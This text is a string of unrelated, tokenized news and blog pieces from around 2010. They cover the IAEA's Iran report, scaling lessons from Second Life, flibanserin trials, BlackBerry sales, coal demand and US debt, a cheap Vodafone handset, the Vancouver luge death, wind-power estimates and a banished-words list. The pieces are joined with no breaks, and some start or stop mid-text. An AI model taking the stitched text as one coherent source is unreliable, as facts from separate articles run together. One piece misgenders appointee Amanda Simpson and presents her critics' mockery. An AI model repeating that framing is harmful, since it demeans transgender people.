“ I do n’t think there ’s any question the Federal Reserve and other regulators were not on top of the housing picture , ” Volcker said .
TEHRAN - Majlis National Security and Foreign Policy Committee Chairman Alaeddin Boroujerdi has said that International Atomic Energy Agency Secretary General Yukiya Amano should amend his latest report about Iran ’s nuclear program before delivering it to the IAEA Board of Governors .
“ The agency ’s approach … has become more politicized and the report has been written under pressure from the United States , ” Boroujerdi told the Mehr News Agency on Sunday .
Amano should correct his report before delivering it to the IAEA Board of Governors on March 1 , the MP stated .
Although Iran notified the IAEA before it began enriching uranium to the 20 percent level and asked the agency to send inspectors to monitor the enrichment process , Amano said in his report that Iran started enriching nuclear fuel without informing the agency , Boroujerdi noted .
This will undermine the credibility of the agency ’s reports , he added .
Political analyst Morad Enadi said here on Sunday that the most important part of Amano ’s report is that it says there is no deviation in Iran ’s nuclear energy program from civilian purposes .
“ Amano ’s report contained many positive points .
For instance , he emphasized that the agency ’s inspectors conducted 35 snap inspections of Iran ’s facilities over the past three years , ” Enadi told the Mehr News Agency on Sunday .
Amano is moving on the same path as former IAEA secretary general Mohamed ElBaradei , but because Iran had just started the enrichment of uranium to the 20 percent level and certain Western countries politicized the issue , the end of the report was critical , he said .
In a report issued on Thursday , the UN nuclear watchdog claimed that it has concerns that Iran may be working to develop a nuclear - armed missile .
Iran says that its nuclear activities are being conducted to meet the country ’s growing demand for energy and the IAEA has never found evidence that its nuclear program has been diverted to weapons production .
MP Hojjatoleslam Hossein Ebrahimi said that no one should expect the IAEA to issue reports different from Amano ’s latest report about Iran ’s nuclear program because the agency is dominated by the U.S.
Thus , Iran should press ahead with its peaceful nuclear activities because the agency will never change its approach , Ebrahimi told the Mehr News Agency on Sunday
Over the past decade , building large - scale online applications has become a pretty well - understood science with numerous books , papers , periodicals , forums , and conferences devoted to the subject .
The Web overflows with advice and prescriptions for achieving high reliability at massive scale .
Trouble is , implementing the best scaling practices is not free , and is often overlooked early in a product 's lifecycle .
Small teams use modern frameworks to quickly develop useful applications , with little need to worry about scale : today you can run a successful application on very little infrastructure ... at least , you can up to a point .
Past this point lies an uncomfortable middle ground , where small teams face scaling challenges as their system becomes successful , often without the benefit of an ideal design or lots of resources to implement one .
This article will lay out some pragmatic advice for getting past this point in the real world of limited foresight and budgets .
Learning lessons from Second Life
Most of this information is based on my experience working on Second Life at Linden Lab from 2001 to 2009 .
SL is a highly complex virtual world , incorporating the features of Web services , online games , 3D modeling and programming tools , IM and VOIP , and so on .
Between 2006 and 2007 , the userbase grew dramatically , and while it has become more manageable , it continues to grow today .
We ran into all manner of scaling challenges , and had mixed success meeting them ; ultimately SL did grow to meet the new levels of demand , but we certainly made some mistakes , and there were periods where the reliability of the system really suffered .
As I lay out my advice to teams facing scaling challenges , I 'll be referring to these experiences ; if I had known then what I know now , SL customers would have had a better experience — and I would have gotten a lot more sleep .
Second Life usage grew by a factor of ten between 2006 and 2007 ( Courtesy Linden Lab )
So how do you get from here ( a simple system on a commodity stack ) to there ( a robust system which can be confidently expanded to meet any level of demand ) ?
Plenty of pixels have been spilled on the subject of where you should be headed : to single out one resource at random , Microsoft presented a good paper ( " On Designing and Deploying Internet - Scale Services " [ PDF ] ) with no less than 71 distinct recommendations .
Most of them are good ( " Use production data to find problems " ) ; few are cheap ( " Document all conceivable component failure modes and combinations thereof " ) .
Some of the paper 's key overarching principles : make sure all your code assumes that any component can be in any failure state at any time , version all interfaces such that they can safely communicate with newer and older modules , practice a high degree of automated fault recovery , auto - provision all resources .
This is wonderful advice for very large projects , but herein lies a trap for smaller ones : the belief that you can " do it right the first time . "
( Or , in the young - but - growing scenario , " do it right the second time . " )
This unlikely to be true in the real world , so successful scaling depends on adapting your technology as the system grows .
While developers should certainly try to make scaling - friendly design choices early on , there are many cases where taking the best advice on scalability can drastically increase development cost ( assuming time = money ) .
As a simple example , consider the common notion that a system should tolerate all failures in all its internal components .
To accomplish this , all interface code everywhere in the system must check for a variety of failure conditions and ( presumably ) do something intelligent with them .
Do they retry ?
What if the problem component is overloaded ?
Can the client detect that ?
Should the user be given an error , or simply queued up ?
What if there is a partial - failure condition , where responses take far longer than expected ?
Does all of this interface code need to be non-blocking ?
And so forth .
Even attempting to answer all these questions can eat up a lot of engineering time — time that your team may not have .
Developers do not always want to admit this ( especially early on in a project ) , but implementing everything " correctly " can risk not finishing the project at all , or having to rush through the later stages in order to get something out the door .
In these cases , it 's better to ship , or retain , a design with known deficiencies .
In the rest of the article I 'll survey some of the big issues likely to arise during scale - out , along with strategies for prioritization and mitigation .
Requirements
The first area that most projects tackle ( and hence get into trouble ) is correctly identifying the business need .
How large does the system have to become ?
This is generally a tough question to answer , but taking a look at basic constraints can be informative .
If a recurring billing system needs to touch each user annually , and the product is only available to Internet users in the US and Europe , and by the biggest estimates will achieve no more than 10 % penetration , then it needs to handle about 2 - 3 events per second ( 1bn * 75 % * 10 % / ( 365 * 86,400 ) ) .
Conversely , a chat system with a similar userbase averaging 10 messages / day , concentrated during work hours , might need to handle 20,000 messages per second or more .
( 1bn * 75 % * 10 % * 10 * 2 / 86,400 )
This is a vast difference which may seem obvious , but in more nuanced scenarios it is easy to make a bad assumption about volume , which can lead to inadequate designs or testing , followed by nasty surprises in production .
Just as important are reliability targets : can the system be shut down at regular intervals ?
What are the consequences for failing the various types of requests ( potentially severe for the billing system , and minor for the chat system ) .
If some of these requirements are very stringent , it 's even more important to compare them to the business reality : will reaching a midway growth milestone give you the luxury of additional time or resources to then produce a larger , more expensive design ?
It 's a simple exercise to look at this , but many teams fail to do it thoroughly .
If a team was building both the hypothetical billing and chat systems above , and put in the time to give the chat system a million - message - per - second capacity while making the biller rock - solid up to 10,000 transactions per day , they 'd end up in a scramble to catch up with billing system load while chat was still under-utilized .
If you aim for the wrong goalposts , you risk over - investing in some parts of the system while under - investing in others , which will cause a scramble to catch up down the road .
In October 1996 , the Journal of the Royal Society of Medicine published the following missive and photo contributed by JR Harding , a consultant radiologist at the Royal Gwent Hospital :
A 45 - year - old man was referred for investigation of an undescended right testis by computed tomography ( CT ) .
An ultrasound scan showed a normal testis and epididymis on the left side .
The right testis was not visualized in the scrotal sac or in the right inguinal region .
On CT scanning of the abdomen and pelvis , the right testis was not identified but the left side of the scrotum seemed to be occupied by a screaming ghostlike apparition ( Figure 1 ) .
By chance , the distribution of normal anatomical structures within the left side of the scrotum had combined to produce this image .
What of the undescended right testis ?
None was found .
If you were a right testis , would you want to share the scrotum with that ?
As the old joke has it , men can be turned on with a simple flick of a switch while women require attention to a battery of dials and buttons .
Today the debate over how to stimulate female sexual desire is set to be reopened with the discovery of a drug described as “ Viagra for women ” .
Doctors testing a new anti-depressant found it was useless as a mood brightener - but was unexpectedly effective at boosting the female libido .
Now three clinical trials have shown that the drug fibanserin significantly improved sexual desire and satisfaction in women .
Download the new Independent Premium app Sharing the full story , not just the headlines
The accidental discovery mirrors that of Viagra , which was being tested as a heart medicine in the 1990s when the male subjects prescribed it discovered it had a pleasing side effect .
However , fibanserin is different in that it works on the brain rather than on the genitals , according to John Thorp , professor of obstetrics and gynaecology at the University of North Carolina .
Doctors have long known that in women , the brain is the most important sex organ .
Professor Thorp , who led the studies , said : “ It ’s essentially a Viagra - like drug for women in that diminished desire or libido is the most common feminine sexual problem , like erectile sexaul dysfunction is in men . ”
“ Fibanserin was a poor antidepressant .
However , astute observers noted that it increased libido in laboratory animals and human subjects .
So we conducted multiple clinical trials and the women in our studies who took it for hypoactive sexual desire disorder [ low libido ] reported significant improvements in sexual desire and satisfactory sexual experiences . ”
The trial results were presented yesterday at the Congress of the European Society for Sexual Medicine in Lyon , France .
Funded by Boehringer Ingelheim , manufacturer of fibanserin , the trials and were carried out among 2,000 women in the US , Canada and Europe , using four different doses of the drug .
However , only the highest dose of 100 mgs a day was found to be effective .
Women taking the 100 mg dose reported having more frequent and more satisfying sex and greater desire .
They were also less distressed about their previous sexual problems .
Professor
Thorp said the only currently available treatment for low sexual desire in women was testosterone patches .
Although testosterone is a male hormone , it is also produced in women at lower levels and plays a crucial role in sexual desire .
However , it has unpleasant side effects , including acne and facial hair growth .
“ These results point to a novel approach to pharmacological treatment of the sexual problem that plagues reproductive age women the most , ” he said .
Previous research has suggested that between one in ten and one in four women suffers from low libido , which varies with age and whether they are pre- or post - menopause .
But critics have claimed that drug companies have exaggerated the extent of women 's sexual problems to create new markets .
The feminist author and sex researcher Shere Hite has said : “ It is not arousal pills we need but a whole new kind of physical relations .
The pharmaceutical industry is guilty not just of cynical money - grabbing exaggeration , it has misunderstood the basics of female sexuality . ”
Specialists in sexual medicine agree that the female libido is more complex than the male libido , but claim it can respond to gentle hormonal stimulation .
However Irwin Nazareth , from the Royal Free and University College Medical School , London , said sexual dysfunction needs to be redefined .
In a survey of 1,000 women in north London six years ago , he found that while 40 per cent reported a lack of or loss of sexual desire , only a quarter regarded it as a problem .
“ For many people , reduced sexual interest or response may be a normal adaptation , ” he said .
There 's now the original BlackBerry Curve 83xx series , the BlackBerry Curve 8900 and the more newly - released BlackBerry Curve 8520/30 on the market ... that 's a lot of Curves available for purchase on a lot of carriers in the USA .
And according to the IDC Mobile Devices and Technology Trends division that tracks these things the BlackBerry Curve was yet again the best - selling smartphone in the USA for the calendar Q4 part of 2009 .
The top 10 smartphones sold in America were as follows :
With the BlackBerry brand occupying 5 of the top 10 smartphone models , it is clear that RIM continues to have the broadest and most popular range of smartphones for different customers in the United States .
RIM has shipped over 75 million smartphones to date , including a record 10 million smartphones during its latest quarter alone .
There 's a couple interesting points here to think on .... 1 ) why do all the BlackBerry Curves get grouped together while the iPhone 3G and 3GS get separated out ?
I wonder if the iPhones were grouped if they 'd beat out the Curves ?
2 ) which Curves are selling ?
If it 's mainly the 83xx series ( that you can get for essentially free these days ) that 's flying out the door , is that sort of a bad thing for RIM longer - term as the device they 're selling the most of is the one that 's essentially most out of date and delivering the least - stellar BlackBerry experience of what 's currently available ?
RIM is all about apps these days , and the Curve 83xx do the least - good job of running apps .
Following this notion , it 's a little surprising that the Pearl is outselling the Bold , Storm and Tour ( though it is available from more carriers in the US than any of the other non-Curve devices ) .
3 ) I wonder what 2010 is going to look like ?
The Curve dominated 2009 ... any bets on what we 'll see this year ?!
Congrats again to RIM for kicking some BlackBerry butt in the US market !
And a BIG welcome to any BlackBerry owners out there stumbling onto CrackBerry.com for the first time who fall into these Q4 stats .
You 've found the online destination for all things BlackBerry .

ScreenRant has apparently spoken to a source that revealed a Thundercats movie is still on the horizon for Warner Brothers .
Paul Sopocy
( It ’s Alive ) has allegedly not only finished a first draft screenplay for the film , but has been hired by Warner Brothers to do a rewrite .
That rewrite has already been turned in to the studio .
The source went on to say that while Warner Brothers will handle distribution , Chase Me Productions will act as the producing studio on the film .
That 's not all , ScreenRant has also posted highlights of what could possibly be Sopocy 's script : Until this information is either confirmed or debunked , we should treat it like most Hollywood scoops ; with a grain of salt .
What do you Thundercats fans think ?
Would these plot points fit a proper film adaptation ?
In a tail wagging the dog reversal , researchers have found that simple chemical reactions can mix a solution .
Usually , chemicals are stirred to enhance a reaction , but a new study finds that the reverse is also true : Simple chemical reactions can trigger fluid flows , reports a paper in the January 29 Physical Review Letters .
The research has implications for many chemical reactions , including those inside stars or when carbon dioxide stored deep in the earth encounters water , says study coauthor Anne De Wit of the Université Libre de Bruxelles in Belgium .
De Wit and her colleagues wondered what would happen to fluid flows if the reacting liquids were left alone and not stirred .
The researchers watched a very simple reaction — the neutralization that occurs between hydrochloric acid and sodium hydroxide , a common chemical base — in the absence of stirring .
The researchers carefully injected the denser sodium hydroxide into a container and then added the hydrochloric acid .
The sodium hydroxide stayed on the bottom and the hydrochloric acid sat on top .
Where the two reactive chemicals met , the reaction ’s products — table salt and water — began to form .
As the salty solution formed , it crept upward and hit the lower - density acid , creating tendrils that started to mix the solution .
But the same did n’t happen below the reaction line .
This difference in how the reaction product interacted with each of its chemical parents drove the mixing the team observed .
These asymmetrical patterns , the researchers say , distinguish mixing during a chemical reaction from what happens when two nonreactive liquids meet , which may look more like diffusion or other kinds of mixing .
“ These kinds of beautiful patterns can be observed with very well - known reactions , ” says study coauthor Christophe Almarcha , also of the Université Libre de Bruxelles .
“ This is quite fascinating for someone who ’s done this reaction hundreds of times . ”
The researchers also describe reaction - driven mixing mathematically by creating a model that predicted a pattern that looked like the real thing .
The model can be tweaked to predict patterns for other chemical reactions , which would vary widely , Almarcha says .
“ Our little model system says ‘ pay attention , ’ ” De Wit says .
“ If there are reactions , then new things will happen . ”
For instance , if stored carbon leaches into an aquifer and starts reacting with water , “ those reactions will trigger flows , which will enhance the mixture , ” she says .

It was the best of times for the developing world , and the worst of times for the developed world .
In the developing world , they built savings .
In the developed world , they groaned and sagged under the weight of debt .
In a world where the credit of developed nations had always been believed , the serial monetizations and bailouts set loose an emerging incredulity –driving developing nations into gold , commodity currencies , and land .
In the aftermath of the financial crisis the developing world , measured at about 4.5 billion people , lumbered forth with its insatiable demand for energy .
Mostly coal .
OECD demand growth for oil faltered years ago , as far back as 2004 when oil went above the “ unthinkable ” price of 40 dollars a barrel .
In the developing world , the escalating price of oil did not as much delay , as divert , energy demand to the powergrid .
To an extent that ’s hard to measure , but certainly evidenced by power generation buildout and growth in electrified transport , the rising price of oil sent a confirmatory signal to the Non-OECD : stay on your coal trajectory .
Of course , overall demand for all types of energy in the developing world took off ten years ago .
Indeed , in 2008 for the first time ever , energy demand in the Non-OECD eclipsed by a hair all energy demand in the OECD .
Roughly speaking , we can think of the OECD as the oil users , and the Non-OECD as the coal users .
Gaze upon the chart below :
When the developing world faced higher oil prices , it guided its development toward power generation .
But when the developed world , already married to an oil based infrastructure , faced higher oil prices it guided its development towards growth in credit .
The United States is the number 2 user of coal , behind China , at 565 mtoe per year .
And Germany is the number 7 user of coal at 85 mtoe per year .
But coal demand growth in the OECD is largely halted by infrastructure .
Most of the power generation additions in the OECD the past 30 years have been natural gas fired .
Take a look at the growth of coal demand over the past 20 years , meanwhile , back in the developing world .
While the United States has little room for growth in coal demand , it does indeed have room to reduce coal demand as the depression rolls onward .
It should not have been a surprise to anyone following the latest failed recovery in the housing market , the continued crash in the commercial real estate market , and the predictable fall - offs in auto production ( since cash for clunkers ) that US electricity demand is going nowhere .
Thus , when CSX Railroad announced last week that shipments of coal to US utilities would not be strong this year , it was confirmatory to the macro trend .
Although natural gas is “ more expensive ” on a per unit basis , it generally takes a much bigger spread to get utilities to actually favor coal over natural gas as the latter can be burnt with lower regulatory costs .
The expansion of the FED ’s balance sheet and the explosion in government debt issuance , therefore , may have eased the pain of the US industrial and consumer collapse–but they ’ve done nothing to revive real demand .
And the coming tail - off in electricity use even from low levels is yet another sign that the 2009 stimulus package as well did not come back to Washington in the form of higher industrial activity–and higher tax receipts .
Indeed , tax receipts on both the state and federal level are awful and this accounts for recent declarations from Illinois , New York , and California that they are essentially broke .
In all that empty commercial real estate across the country , where no shoppers roam , and no sales tax is recorded , the thermostats are turned down , and the lights are turned off .
Meanwhile , there is every indication that the FED is going to have to extend its quantitative easing as the supply of Treasuries continues to ramp higher , while US savings and international capital flows are simply not enough to supply the necessary bid , in US Treasuries .
Moreover , it ’s likely that a great deal of last year ’s bid in US Treasuries was simply the FED ’s monetization of the mortgage - backed securities market ( MBS ) coming back in the form of Treasury demand .
The FED in a program of ongoing duration started purchasing 1.3 trillion of MBS starting last year , with the intent to continue through the end of March 2010 .
Should they not extend the MBS purchase program , I would expect Treasury prices to fall .
Foreigners have already been avoiding the longer end of the bond curve , or simply reducing Treasury purchases overall .
( See : Debt Burden Now Rests More on US Shoulders . )
Additionally , there is the problem of duration , in that Treasury has been funding a large portion of US deficit spending with shorter duration bonds .
That means a larger number of bonds mature in shorter timeframes .
Thus , in 2010 , the US not only has to float a large new supply of Treasuries but it has to find buyers for its maturing supply of Treasuries .
( See : The $ 700 Billion U.S. Funding Hole ; Desperately Seeking A Very Indiscriminate Treasury Buyer . )
Surprisingly , or perhaps perversely , 2010 sees an accelerated continuation of the 10 year trend in developing world coal demand and developed world credit growth .
For all of its reflationary firepower , the OECD has at best eased the acute phase of deflation while sparking strong inflation in the Non-OECD .
Here in the developed world we continue to see asset price deflation in real estate , though notably , our purchasing power has started to fall in the aggregate in both the US and in Britain .
( In China , inflation threatens to rage . )
The problem for the OECD is that energy demand in the Non OECD does not translate well to demand growth for US Treasuries or UK Gilts .
Coal prices are strong however because US utilities may not require more coal but pan-Asian utilities continue to build capacity , and the trajectory higher continues .
In January 2009 I asserted that the 27 year bull market in US Treasuries had ended in the blow off panic spike ( in prices ) just that December .
I maintain that view now .
And , while Washington may at times entertain thoughts of choosing a deflationary pathway out of the crisis–call it a liquidationist urge , if you will –the voices that beckon to inflate our way out of the crisis will always win out in the end .
The developing world is clear - eyed enough to know that it cannot depend on developed world demand to keep its factories running .
This is why a lot of direct trade occurs now within the Non-OECD that is designed to both trigger domestic demand and also facilitate resource - for - resource deals which lock up supply .
It is in the developed world however that the lack of sobriety has reached epidemic levels , as we keep trying to replace both energy inputs and production - –with credit .
When the growth in private credit could no longer carry the weight and failed , we embarked on a mad dash to do the same with sovereign credit .
If the OECD and especially the United States were building new power generation or electrified transport with this credit , we could at least expect to get some return on the investment .
But alas , we are hellbent still in trying to revive consumer demand .
Thus , for all the growth in government debt , we are doing nothing more than pouring water on concrete .

Mobile banking services have helped drive uptake of phones Mobile phone operator Vodafone has launched what it says is the " lowest - cost mobile phone on Earth " .
The Vodafone 150 , unveiled at the Mobile World Congress in Barcelona , will sell for " below $ 15 " ( £ 10 ) and is aimed at the developing world .
It will initially be launched in India , Turkey and eight African countries including Lesotho , Kenya and Ghana .
The UN predicts that mobile ownership will reach 5bn in 2010 , with most growth in the developing world .
The International Telecommunications Union ( ITU ) said that demand was being driven by people using their phones to access banking and mobile health services .
" Even the simplest , low - end mobile phone can do so much to improve healthcare in the developing world , " said ITU secretary general Dr Hamadoun Toure .

Has your phone changed your life ?
For example , he said , SMS can be used to " deliver instructions on when and how to take complex medication such as anti-retrovirals or vaccines " .
" It 's such a simple thing to do , and yet it saves millions of dollars , " he said .
Mobile phones have also become an increasingly popular way to transfer and save money in the developing world .
For example , a system known as M - Pesa in Kenya , which allows people to transfer money , now has around six million customers .
Vodafone estimates that there are more than 11 million customers using banking services on its networks .
The Vodafone 150 is designed to bring these services to more people , the firm said .
The handset allows voice calls , SMS and has built - in support for mobile payment services .
A more expensive version - known as the Vodafone 250 - also has a colour screen and an FM radio , and will sell for $ 20 .
Ken Banks , founder of Frontline SMS and an expert in mobile phone use in the developing world said the $ 15 price tag " lowers the bar , but not by a huge amount " .
" I bought a HTC mobile in Uganda two years ago for just over $ 20 equivalent , so depending on how you play exchange rates this is n't hugely different price wise , " he told BBC News .
" The price has come down but in terms of features [ cheap phones have ] remained largely static with poor memory , monochrome screens , no browser , and so on .
" The trick is to reduce the price and increase functionality , and few manufacturers have managed to crack this to any real extent , " he told BBC News .

President Obama recently appointed a “ transgendered ” man as a Senior Technical Adviser to the U.S. Department of Commerce .
Amanda Simpson , a former test pilot for Raytheon who now identifies himself as female , will serve in the Bureau of Industry and Security .
Critics of the appointment argue that it is " political correctness run amok . "
Simpson , a board member of Out & Equal and the National Center for Transgender Equality ( NCTE ) , said on Dec. 31 that he is “ truly honored to have received this appointment ” and expressed a desire “ that this appointment opens future opportunities for many others . ”
“ What 's unfortunate , ” said Matt Barber , Director of Cultural Affairs for the Liberty Counsel , is that Simpson “ has a history of radical transgender activism . ”
Barber explained to CNA that the issue is not simply having a transgendered person in a prestigious position of authority in the government , but the apparent agenda that this individual has .
“ He may very well be qualified for this position but it appears that he was not picked ( merely ) for his qualifications , he was picked because of his wardrobe , ” Barber commented to CNA .
“ That is not diversity or tolerance .
It 's political correctness run amok . ”
Speaking to ABC News , Mara Keisling , the executive director of the National Center for Transgender Equality , countered , " This is a real serious technical policy position and the job matches her resume .
Her being transgender had nothing to do with getting that job . "
However , Barber continued to express his concern regarding the future ramifications of Simpson 's appointment , arguing that it is part of a larger movement within the current administration .
“ With hate crimes legislation and ENDA ( Employment Non Discrimination Act ) and other radical GLBT pieces of legislation that are being pushed by the Obama Administration , ” Barber told CNA , those who disagree with the GLBT perspective “ literally can and will face criminal or civil penalty . ”
Peter LaBarbera , president of Americans for Truth voiced similar concern on the Focus on the Family Action website on Jan .
4 . “ Is there going to be a transgender quota now in the Obama Administration ?
How far does this politics of gay and transgender activism go ?
Clearly this is an administration that is pandering to the gay lobby , ” he said .
Barber added that in his opinion “ there is no doubt ” that Simpson 's appointment “ is an effort to normalize ” transgender issues and “ desensitize ” American society .
Officials said Kumaritashvili ’s death was the first luge fatality since 1975 .
Several sliders and officials said it could not have been foreseen .
But the idea that something terrible might happen here , on the fastest course in the world , was talked about publicly and feared for a year .
Frequent concerns were expressed about excessive speeds .
Even Armin Zoeggeler of Italy , a two - time Olympic champion and a favorite here , had crashed on this track .
On Thursday , after struggling to maintain control of her sled , Hannah Campbell - Pegg of Australia said , “ To what extent are we just little lemmings that they throw down a track and we ’re crash - test dummies ? ”
Canadian reporters said Saturday morning that they had been told privately during the week of concerns for the safety of four sliders  Kumaritashvili included .
So many people knew of possible danger .
So little was done to prevent it .
Canada ’s decision to give minimal access to the Olympic track to athletes from other nations now seems to have been an unfortunate nationalistic impulse .
This was done to give Canadians a home - field advantage in a program called Own the Podium .
In the end , safety took a back seat to patriotism .
“ I ’m all for giving the advantage of the home track to the home country , ” said Shiva Kannan Palan Keshavan , a 12 - year veteran from India .
“ At the same time , everybody should get enough runs to be comfortable .
Safety cannot be compromised . ”
The president of Georgia , Mikheil Saakashvili , said in a news conference Saturday that officials should have listened more carefully to athletes ’ concerns about the safety of the track .
“ I do n’t claim to know all the technical details , ” he said .
“ But one thing I know for sure , that no sports mistake is supposed to lead to a death .
No sports mistake is supposed to be fatal . ”
The amount of wind power that theoretically could be generated in the United States tripled in the newest assessment of the nation 's wind resources .
Current wind technology deployed in nonenvironmentally protected areas could generate 37,000,000 gigawatt - hours of electricity per year , according to the new analysis conducted by the National Renewable Energy Laboratory and consulting firm AWS Truewind .
The last comprehensive estimate came out in 1993 , when Pacific Northwest National Laboratory pegged the wind energy potential of the United States at 10,777,000 gigawatt - hours .
Both numbers are greater than the 3,000,000 gigawatt - hours of electricity currently consumed by Americans each year .
Wind turbines generated just 52,000 gigawatt - hours in 2008 , the last year for which annual statistics are available .
Though new and better data was used to create the assessment , the big jump in potential generation reflects technological change in wind machines more than fundamental new knowledge about our nation 's windscape .
Wind speed generally increases with height , and most wind turbines are taller than they used to be , standing at about 250 feet ( 80 meters ) instead of 165 feet ( 50 meters ) .
Turbines are now larger , more powerful and better than the old designs that were used to calculate previous estimates .
" Now we can develop areas that in [ previous decades ] would n't have been deemed developable , " said Michael Brower , chief technology offier with AWS Truewind , which carried out the assessment .
" It 's like oil reserves .
They tend to go up not because there is more oil in the ground but because the technology for accessing the oil gets better . "
The new maps , above , are useful for would - be wind - farm developers who need to find promising sites on which to place their turbines .
They want locations with high wind speeds , access to transmission lines , cheap land and a host of other smaller logistical concerns .
If you purchase the best versions , the Truewind maps have a resolution of 650 feet ( 200 meters ) , which is less than the spacing between modern machines .
That means they can be used to provisionally site individual machines on the ground .
Many estimates have been made of the wind energy potential of the United States and the Earth .
John Etzler made one of the first way back in the 1830s .
He used loose numerical analogies to sailing ships to calculate that " the whole extent of the wind 's power over the globe amounts to about ... 40,000,000,000,000 men's power . "
The water - pumping windmill industry flourished in latter half of the 19th century , but wind energy potential calculations did not advance past the back - of - the - envelope until after World War II .
When Palmer Putnam attempted to find the best site in Vermont for the first - megawatt sized wind turbine in the early 1940s , his first line of analysis was to look at how bent the trees were .
The 1980s saw a boom in wind energy in the state of California , driven by a number of federal and state incentives as well as an active environmental culture .
Back then , the only way to really know how hard and often the wind blew was to put up a tower covered in sensors and measure .
So , wind - farm developers concentrated their efforts on three areas – Tehachapi , Altamont Pass and San Gorgonio – and covered the places with towers to measure the wind .
" I still have some databases from back then and you look at them and say , ' Oh my , they had 120 towers up , ' or something crazy , " Brower said .
" That 's not how it 's done anymore . "
Even low - resolution regional maps did not exist until the early 1980s and the first national map was only published by the National Renewable Energy Laboratory ( née Solar Energy Research Institute ) in 1986 .
As you can see from the map above , it was more of a general guide than a series of detailed local estimates .
The real boom in wind data came with the availability of cheap computational power in the late 1990s .
It was then that Brower 's company began being able to marry large - scale weather models with small - scale topographic models .
They created a parallel process for crunching wind data and ran it on small , fast PCs to get supercomputer - level power at low cost .
Then , they refined their estimates with data from 1,600 wind measurement towers .
The result is a much more accurate forecast .
Truewind 's estimates of wind speed at a location have an uncertainty margin of 0.35 meters a second .
Good wind sites have average wind speeds of between 6.5 and 10 m/s , though most onshore areas do n't get above 9 .
Perhaps more importantly , their estimates for how many kilowatt - hours a turbine in a location will produce are accurate to within 10 percent , Brower stated .
The newest models are now sufficiently good that developers do n't need as much on - site data .
They do still use towers to check the maps and models produced by companies like Truewind , but not nearly as many , which reduces the expense and time that it takes to execute a project .
" You might see 10 or 15 towers over an area that would have had 50 or 100 towers before , " he said .
The new data , including these maps and forecasting models , may not directly make wind farms cheaper , but the advances certainly makes them easier to plan for , develop and operate .
" I think of it more as greasing the wheels of the process more than producing a really big cost savings , " Brower said .
" You reduce the friction , the transaction costs , and that enables you to get where you 're going faster . "
The better processes , along with state renewable - energy mandates , seem to be helping .
In 2009 , 10 gigawatts of wind capacity was installed in the United States to bring the nation 's total to 35 gigawatts .
The data plays a more subtle role , too .
In helping make the case that wind energy can play a very substantial role in supplying electricity , the new maps and estimates could help convince industrial and political leaders to support renewable energy , particularly in windy heartland states like Kansas , Montana and Nebraska .

SAULT STE .
MARIE , Mich . --
Word " czars " at Lake Superior State University " unfriended " 15 words and phrases and declared them " shovel - ready " for inclusion on the university 's 35th annual List of Words Banished from the Queen 's English for Mis-use , Over-use and General Uselessness .
" The list this year is a ' teachable moment ' conducted free of ' tweets , ' " said a Word Banishment spokesman who was " chillaxin ' " for the holidays .
" ' In these economic times ' , purging our language of ' toxic assets ' is a ' stimulus ' effort that 's ' too big to fail . ' "
LSSU Banish cartoon by Ron Raffaele - RonRaffaele.com
Former LSSU Public Relations Director Bill Rabe and friends created " word banishment " in 1975 at a New Year 's Eve party and released the first list on New Year 's Day .
Since then , LSSU has received tens of thousands of nominations for the list , which includes words and phrases from marketing , media , education , technology and more .
For more information about Word Banishment and previous year 's lists , visit www.lssu.edu/banished.
The site includes history and a form for submitting words and phrases .
Word - watchers may check the alphabetical " complete list " on the website before making their submissions .
For the 2010 list , read on :
SHOVEL - READY
" Apparently , the generally accepted definition of this phrase is to imply that a project has been completely designed and all that is left to do is to implement it ... however , when something dies , it , too , is shovel - ready for burial and so I get confused about the meaning .
I would suggest that we just say the project is ready to implement .
 Jerry Redington , Keosauqua , Iowa .
" A relatively new term already overused by media and politicians .
Bury this term , please . " 
Pat Batcheller , Southgate , Mich .
" Do I really need a reason ?
Well , if so how about this : I just saw it in tandem with ' cyber - ready ' and nearly choked on my coffee .
It 's starting the ' - ready ' jargon .
Makes me ' vacation - ready . ' "  Karen Hill , Ann Arbor , Mich .
" Stick a shovel in it .
It 's done . "  Joe Grimm , Bloomfield Hills , Mich .
IN THESE ECONOMIC TIMES .
Nominations concerning the economy started rolling in as the 2009 list was being put together last year , i.e. " bailout . "
They kept coming this year , in these trouble economic times .
" South Park " warned us about what would happen if we angered The Economy .
" Overused and redundant .
Are n't ALL times ' these economic times ' ? " -- Barb Stutesman , Three Rivers , Mich .
" In this economy , we can't afford to be wasteful
In this economy , we all need some security
In this economy , frogs could start falling from the sky ...
In this economy , blah blah blah ...
Overused for everything from trying to market products as inexpensive to simply explaining any and all behavior during the recession . "
 Mark , Milwaukee , Wisc .
" When someone prefaces a statement with ' in this economic climate , ' its starts to sound like a sales pitch , or just an excuse on which to blame every problem .
And if a letter or e-mail message from your employer starts with this phrase , usually it means you 're not getting a raise this year . "
 Dominic , Seattle , Wash .
STIMULUS
" Everything in the news is about the stimulus packages ... it is no longer a grant , it 's stimulus money , stimulus checks , etc .
I think it is just being over - used . "
Teri Heikkila , Rudyard , Mich .
" Overused by companies to advertise a promotion . "  David Willis , Houston , Tex .
" What next , can I go down to the local bar and down a few drinks and call it a stimulus package ? "  Richard Brown , Portland , Ore .
TOXIC ASSETS
We think we 're going to be sick .
" Whatever happened to simply ' bad stocks , ' ' debts , ' or ' loans ' ? " -- Monty Heidenreich , Homewood , Ill .
" What a wretched term ! " Lee Freedman , Sault Ste. Marie , Mich .
TOO BIG TO FAIL
" Just for the record , nothing 's too big to fail unless the government lets it . "
Claire Shefchik , Brooklyn , NY .
" Does such a thing exist ?
We 'll never know if a company is too big to fail , unless somehow it does fail , and then it will no longer be too big to fail .
Make it stop ! "  Holli , Raleigh , NC .
TRANSPARENT / TRANSPARENCY
" I can see clearly that this is the new buzzword for the year . " -- Joann Eschenburg , Clinton Twp. , Mich .
" In the lexicon of the political arena , this word is supposed to mean obvious or easily understood .
In reality , political transparency is more invisible than obvious ! " -- Deb Larson , Bellaire , Mich .
" I just do n't see it . "  Joe Grimm , Bloomfield Hills , Mich .
CZAR
Long used by the media as a metaphor for positions of high authority , including baseball czar Judge Kenesaw Mountain Landis , appointed by team owners as commissioner - for - life in 1919 .
U.S. president Woodrow Wilson had an industry czar during World War I. Lesser - known czar roles in government during the last 100 years include : censorship , housing and oil czars in 1941 ; rubber czar in 1942 ; patronage czar ( 1945 ) ; clean - up ( 1952 ) ; missile ( 1954 ) ; inflation ( 1971 ) ; e-commerce ( 1998 ) ; bioethics , faith - based and reading czars ( 2001 ) ; bird flu ( 2004 ) ; democracy ( 2005 ) ; abstinence and birth control czars ( 2006 ) ; and weatherization czar ( 2008 ) .
